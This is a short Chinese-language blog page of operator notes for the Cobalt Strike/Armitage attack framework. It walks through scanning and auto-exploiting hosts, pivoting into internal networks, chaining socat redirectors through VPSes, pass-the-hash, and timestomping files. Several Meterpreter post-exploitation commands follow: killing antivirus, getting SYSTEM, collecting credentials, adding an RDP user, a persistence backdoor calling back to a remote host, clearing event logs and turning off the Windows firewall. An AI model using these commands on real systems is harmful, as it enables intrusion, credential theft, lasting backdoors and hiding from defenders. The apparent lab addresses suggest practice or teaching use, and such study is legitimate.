---
layout: default
---
# ![](../img/hj.jpg)CobaltStrike
```
先启动teamserver,建立服务端
./teamserver 10.10.10.128 mima

自己电脑
./cobaltstrike

登陆之后上面host>nmap scan
然后attacks>find attacks>by port
右键目标图标，attack，check exploit,在下面搜索find:vulnerable,然后右键选可用的exploit，也可根据对方service用相应的exploiit

外网进内网的话，入侵一个双网卡主机，add pivots,选内网ip，然后扫描内网段，ip之间用，号隔开，看内网service也可以判定主机os，然后再次find attacks,然后继续攻击

beacon
在vps1，vps2，vps3，vps4中
socat TCP4 -LISTEN:80,fork TCP:teamserver的ip:80
 添加listener，host 添vps1,之后的对话框输入vps2,vps3
payloads 中添vps4

top 10 功能：
1、module launching 模块发射
2、pivoting 支点
3、console
4、module browser 左边栏
5、table view
6、pass the hash 先dump一台hash，然后find attack,在其他目标attack,smb,pass the hash,选刚刚被攻的hash，launch，如果密码一样，自动开session
7、timestomp 修改文件属性
在browser file中选个文件，右键 timestomp，get mace values,set mace values
8、command shells
9、shell upload 右键 shell,upload
10、hail mary 相当于db_autopwn

常用post
getcontermeasure -k -d
use priv
getsystem
credcollect
enum_firefox
run getgui -u haha -p wawa
persostence -X -i 30 -p 4545 -r 10.10.10.140
run event_manager -r
exploit -j -z

关闭防火墙，shell中
netsh advfirewall set allprofiles state off

```

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./tools)
